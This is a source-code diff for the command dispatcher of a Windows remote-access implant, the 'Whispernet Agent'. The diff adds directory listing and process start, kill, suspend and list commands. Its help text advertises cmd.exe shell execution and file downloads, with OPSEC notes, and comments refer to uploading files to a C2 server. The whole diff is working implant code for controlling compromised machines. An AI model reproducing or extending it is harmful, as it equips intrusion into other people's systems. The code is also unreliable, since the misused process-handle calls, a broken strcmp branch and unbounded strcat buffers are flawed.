@@ -8,6 +8,9 @@
 #include "whisper_winapi.h"
 #include "whisper_dynamic_config.h"
 
+//function command related items
+#include <tlhelp32.h> // For CreateToolhelp32Snapshot, Process32First, Process32Next
+
 
 /*
     Baked in commands to Whispernet Agent
@@ -40,6 +43,14 @@ void delete_file(OutboundJsonDataStruct* response_struct, char* args);
 void append_file(OutboundJsonDataStruct* response_struct, char* args);
 void rename_file(OutboundJsonDataStruct* response_struct, char* args);
 void copy_file(OutboundJsonDataStruct* response_struct, char* args);
+void ls(OutboundJsonDataStruct* response_struct, char* args);
+
+//process stuff
+void start_process(OutboundJsonDataStruct* response_struct, char* args);
+void kill_process(OutboundJsonDataStruct* response_struct, char* args);
+void suspend_process(OutboundJsonDataStruct* response_struct, char* args);
+void resume_process(OutboundJsonDataStruct* response_struct, char* args);
+void list_processes(OutboundJsonDataStruct* response_struct);
 
 // ====================
 // Functions
@@ -51,7 +62,7 @@ void copy_file(OutboundJsonDataStruct* response_struct, char* args);
 int parse_command(char* command, char* args, OutboundJsonDataStruct* response_struct) {
     if (!response_struct) {
         DEBUG_LOG("[!] response_struct is NULL!\n");
-        return -1; // Error case
+        return -1;
     }
 
     DEBUG_LOG("Struct UUID: %s\n", response_struct->agent_id);
@@ -105,7 +116,25 @@ int parse_command(char* command, char* args, OutboundJsonDataStruct* response_st
     } else if (strcmp(command, "copy_file") == 0) {
         DEBUG_LOG("[COMMAND] copy_file\n");
         copy_file(response_struct, args);
-    } else {
+    } else if (strcmp(command, "ls") == 0) {
+        DEBUG_LOG("[COMMAND] ls\n");
+        ls(response_struct, args);
+    } else if (strcmp(command, "start_process") == 0) {
+        DEBUG_LOG("[COMMAND] start_process\n");
+        start_process(response_struct, args);
+    } else if (strcmp(command, "kill_process") == 0) {
+        DEBUG_LOG("[COMMAND] kill_process\n");
+        kill_process(response_struct, args);
+    } else if (strcmp(command, "suspend_process") == 0) {
+        DEBUG_LOG("[COMMAND] suspend_process\n");
+        suspend_process(response_struct, args);
+    } else if (strcmp(command, "resume_process") == 0) {
+        DEBUG_LOG("[COMMAND] resume_process\n");
+        resume_process(response_struct, args);
+    } else if (strcmp(command, "list_process")) {
+        DEBUG_LOG("[COMMAND] list_process\n");
+        list_processes(response_struct);
+    }   else {
         DEBUG_LOG("[COMMAND] Unknown command!\n");
         set_response_data(response_struct, "Unknown command");
     }
@@ -391,28 +420,35 @@ void sleep(OutboundJsonDataStruct* response_struct, char* args) {
 
 // Keep
 void help(OutboundJsonDataStruct* response_struct) {
-    const char* help_string = "Help:\n\
-> File Commands: [Not WhisperWinAPI Yet] \n\
-    write_file: (write_file <str: path> <str: contents>): Writes contents to a file.\n\
-    read_file: (read_file <str: path>): Reads contents of a file.\n\
-    delete_file: (delete_file <str: path>): Deletes a file.\n\
-    append_file: (append_file <str: path> <str: contents>): Appends data to an existing file.\n\
-    rename_file: (rename_file <str: old_path> <str: new_path>): Renames or moves a file.\n\
-    copy_file: (copy_file <str: src> <str: dest>): Copies a file from one location to another.\n\
-> Directory Commands: [Not WhisperWinAPI Yet] \n\
-    mkdir: (mkdir <str: directory>): Creates a new directory.\n\
-    rmdir: (rmdir <str: directory>): Removes a directory.\n\
-    cd: (cd <str: directory>): Changes the current directory.\n\
-    pwd: (pwd): Prints the current working directory.\n\
-> Loud Commands\n\
-    http_get: (http_get <str: url> <str: filepath>): Get an HTTP file, and save at the <filpath>\n\
-        [ OPSEC: Will write file to disk ]\n\
-    shell: (shell <str: command>): Run a command via cmd.exe\n\
-        [ OPSEC: Runs a new cmd.exe process ]\n\
-    messagebox: (messagebox <str: title> <str: message>): Pop a messagebox with a message\n\
-        [ OPSEC: Shows on users screen ]\n\
-> Config Commands:\n\
-    sleep: (sleep <int: sleeptime (seconds)): How long to sleep for/update sleep time\n\
+    const char* help_string = "Help:\n\n\
+**File Commands:**\n\
+    `write_file`: (write_file <str: path> <str: contents>) - Writes contents to a file.\n\
+    `read_file`: (read_file <str: path>) - Reads contents of a file.\n\
+    `delete_file`: (delete_file <str: path>) - Deletes a file.\n\
+    `append_file`: (append_file <str: path> <str: contents>) - Appends data to an existing file.\n\
+    `rename_file`: (rename_file <str: old_path> <str: new_path>) - Renames or moves a file.\n\
+    `copy_file`: (copy_file <str: src> <str: dest>) - Copies a file from one location to another.\n\n\
+**Directory Commands:**\n\
+    `mkdir`: (mkdir <str: directory>) - Creates a new directory.\n\
+    `rmdir`: (rmdir <str: directory>) - Removes a directory.\n\
+    `cd`: (cd <str: directory>) - Changes the current directory.\n\
+    `pwd`: (pwd) - Prints the current working directory.\n\
+    `ls`: (ls <str: path (optional)>) - Lists files and directories in the specified path (or current directory if none provided).\n\n\
+**Process Commands:**\n\
+    `start_process`: (start_process <str: command>) - Starts a new process.\n\
+    `kill_process`: (kill_process <int: PID>) - Kills a process by PID.\n\
+    `suspend_process`: (suspend_process <int: PID>) - Suspends a process.\n\
+    `resume_process`: (resume_process <int: PID>) - Resumes a suspended process.\n\
+    `list_processes`: - Lists all running processes.\n\n\
+**Misc Commands:**\n\
+    `http_get`: (http_get <str: url> <str: filepath>) - Downloads an HTTP file.\n\
+        *[OPSEC: Will write file to disk]*\n\
+    `shell`: (shell <str: command>) - Runs a command via cmd.exe.\n\
+        *[OPSEC: Runs a new cmd.exe process]*\n\
+    `messagebox`: (messagebox <str: title> <str: message>) - Displays a message box.\n\
+        *[OPSEC: Shows on users screen]*\n\n\
+**Config Commands:**\n\
+    `sleep`: (sleep <int: sleeptime (seconds)>) - Sets the sleep time.\n\n\
 ";
 
     set_response_data(response_struct, help_string);
@@ -701,6 +737,224 @@ void copy_file(OutboundJsonDataStruct* response_struct, char* args) {
     }
 }
 
+void ls(OutboundJsonDataStruct* response_struct, char* args) {
+    char* context = NULL;
+    char* path = strtok_s(args, " ", &context);
+
+    if (!path) {
+        // Use current directory if path is not provided
+        path = "."; // Or get the current directory using GetCurrentDirectory
+    }
+
+
+    WIN32_FIND_DATAW wfd; // Unicode find data structure
+    HANDLE hFind = INVALID_HANDLE_VALUE;
+
+    // Prepare the string for use with FindFirstFileW.  Need to convert to wide char
+    wchar_t wPath[MAX_PATH];
+    mbstowcs(wPath, path, MAX_PATH); // Convert from char* to wchar_t*
+
+    wchar_t searchPath[MAX_PATH];
+    swprintf(searchPath, MAX_PATH, L"%s\\*", wPath); // Add the wildcard
+
+    hFind = FindFirstFileW(searchPath, &wfd);
+
+    if (hFind == INVALID_HANDLE_VALUE) {
+        DWORD error = GetLastError();
+        char error_message[256];
+        FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
+        set_response_data(response_struct, error_message);
+        return;
+    }
+
+    char fileList[4096] = ""; // Buffer to store the list of files (adjust size as needed)
+    char tempFileName[MAX_PATH];
+
+    do {
+        // Convert back to char* for concatenation
+        wcstombs(tempFileName, wfd.cFileName, MAX_PATH);  // Convert wide char to multibyte
+
+        strcat(fileList, tempFileName);
+        strcat(fileList, "\n"); // toss in a newline after appending each item
+    } while (FindNextFileW(hFind, &wfd) != 0);
+
+    FindClose(hFind);
+
+    if (strlen(fileList) == 0) {
+        set_response_data(response_struct, "No files found.");
+    } else {
+      set_response_data(response_struct, fileList);
+    }
+}
+
+/*
+Process Ops
+
+*/
+
+void start_process(OutboundJsonDataStruct* response_struct, char* args) {
+    char* context = NULL;
+    char* command = strtok_s(args, " ", &context);
+
+    if (!command) {
+        set_response_data(response_struct, "Invalid arguments. Expected: <command>");
+        return;
+    }
+
+    STARTUPINFOA si;
+    PROCESS_INFORMATION pi;
+
+    ZeroMemory(&si, sizeof(si));
+    si.cb = sizeof(si);
+    ZeroMemory(&pi, sizeof(pi));
+
+    if (CreateProcessA(NULL, command, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
+        DEBUG_LOG("Process started successfully. PID: %lu\n", pi.dwProcessId);
+        char message[256];
+        snprintf(message, sizeof(message), "Process started successfully. PID: %lu", pi.dwProcessId);
+        set_response_data(response_struct, message);
+
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+    } else {
+        DWORD error = GetLastError();
+        char error_message[256];
+        FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
+        set_response_data(response_struct, error_message);
+    }
+}
+
+void kill_process(OutboundJsonDataStruct* response_struct, char* args) {
+    char* context = NULL;
+    char* pid_str = strtok_s(args, " ", &context);
+
+    if (!pid_str) {
+        set_response_data(response_struct, "Invalid arguments. Expected: <PID>");
+        return;
+    }
+
+    DWORD pid = strtoul(pid_str, NULL, 10); // Convert PID string to unsigned long
+
+    HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
+    if (hProcess == NULL) {
+        DWORD error = GetLastError();
+        char error_message[256];
+        FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
+        set_response_data(response_struct, error_message);
+        return;
+    }
+
+    if (TerminateProcess(hProcess, 1)) { // 1 is the exit code
+        set_response_data(response_struct, "Process terminated successfully");
+    } else {
+        DWORD error = GetLastError();
+        char error_message[256];
+        FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
+        set_response_data(response_struct, error_message);
+    }
+
+    CloseHandle(hProcess);
+}
+
+void suspend_process(OutboundJsonDataStruct* response_struct, char* args) {
+    char* context = NULL;
+    char* pid_str = strtok_s(args, " ", &context);
+
+    if (!pid_str) {
+        set_response_data(response_struct, "Invalid arguments. Expected: <PID>");
+        return;
+    }
+
+    DWORD pid = strtoul(pid_str, NULL, 10);
+
+    HANDLE hProcess = OpenProcess(PROCESS_SUSPEND_RESUME, FALSE, pid);
+    if (hProcess == NULL) {
+        DWORD error = GetLastError();
+        char error_message[256];
+        FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
+        set_response_data(response_struct, error_message);
+        return;
+    }
+
+    if (SuspendThread(hProcess) != (DWORD)-1) { // Suspend the main thread
+        set_response_data(response_struct, "Process suspended successfully");
+    } else {
+        DWORD error = GetLastError();
+        char error_message[256];
+        FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
+        set_response_data(response_struct, error_message);
+    }
+
+    CloseHandle(hProcess);
+}
+
+void resume_process(OutboundJsonDataStruct* response_struct, char* args) {
+    char* context = NULL;
+    char* pid_str = strtok_s(args, " ", &context);
+
+    if (!pid_str) {
+        set_response_data(response_struct, "Invalid arguments. Expected: <PID>");
+        return;
+    }
+
+    DWORD pid = strtoul(pid_str, NULL, 10);
+
+    HANDLE hProcess = OpenProcess(PROCESS_SUSPEND_RESUME, FALSE, pid);
+    if (hProcess == NULL) {
+        DWORD error = GetLastError();
+        char error_message[256];
+        FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
+        set_response_data(response_struct, error_message);
+        return;
+    }
+
+    if (ResumeThread(hProcess) != (DWORD)-1) {
+        set_response_data(response_struct, "Process resumed successfully");
+    } else {
+        DWORD error = GetLastError();
+        char error_message[256];
+        FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
+        set_response_data(response_struct, error_message);
+    }
+
+    CloseHandle(hProcess);
+}
+
+void list_processes(OutboundJsonDataStruct* response_struct) {
+    HANDLE hProcessSnapshot = INVALID_HANDLE_VALUE;
+    PROCESSENTRY32 pe32;
+
+    pe32.dwSize = sizeof(PROCESSENTRY32);
+
+    hProcessSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hProcessSnapshot == INVALID_HANDLE_VALUE) {
+        DWORD error = GetLastError();
+        char error_message[256];
+        FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
+        set_response_data(response_struct, error_message);
+        return;
+    }
+
+    char processList[8192] = ""; // Adjust size as needed.  Consider dynamic allocation for very large lists.
+    char tempProcessInfo[512]; // Temporary buffer for each process's info
+
+    if (Process32First(hProcessSnapshot, &pe32)) {
+        do {
+            snprintf(tempProcessInfo, sizeof(tempProcessInfo), "%lu\t%s\n", pe32.th32ProcessID, pe32.szExeFile); // PID and process name
+            strcat(processList, tempProcessInfo);
+        } while (Process32Next(hProcessSnapshot, &pe32));
+    }
+
+    CloseHandle(hProcessSnapshot);
+
+    if (strlen(processList) == 0) {
+        set_response_data(response_struct, "No processes found.");
+    } else {
+        set_response_data(response_struct, processList);
+    }
+}
+
+
 /*
  Stub commands for things that can to be added for more functionality
 
@@ -717,19 +971,18 @@ void copy_file(OutboundJsonDataStruct* response_struct, char* args) {
 // void upload_file(response_struct, src, dest) - Upload a file to the C2
 // void search_file(response_struct, dir, pattern) - Search for files matching a wildcard pattern
 
-// Directory Operations
+// Directory Operations [NOT WHISPER_WINAPI YET]
 // [X] void mkdir(response_struct, path) - Create a directory
 // [X] void rmdir(response_struct, path) - Remove a directory
 // [X] void cd(response_struct, path) - Change directory
 // [X] void pwd(response_struct) - Get current working directory
-// void ls(response_struct, path) - List files in a directory
+// [X] void ls(response_struct, path) - List files in a directory //not great but works
 
 // Process and Execution
-// void start_process(response_struct, command) - Start a new process
-// void kill_process(response_struct, pid) - Kill a process by PID
-// void suspend_process(response_struct, pid) - Suspend a process
-// void resume_process(response_struct, pid) - Resume a suspended process
-// void shell(response_struct, command) - Execute a shell command and return output
+// [ ] void start_process(response_struct, command) - Start a new process
+// [ ]  void kill_process(response_struct, pid) - Kill a process by PID
+// [ ]  void suspend_process(response_struct, pid) - Suspend a process
+// [ ]  void resume_process(response_struct, pid) - Resume a suspended process
 
 // System Information
 // void get_username(response_struct) - Get the current username
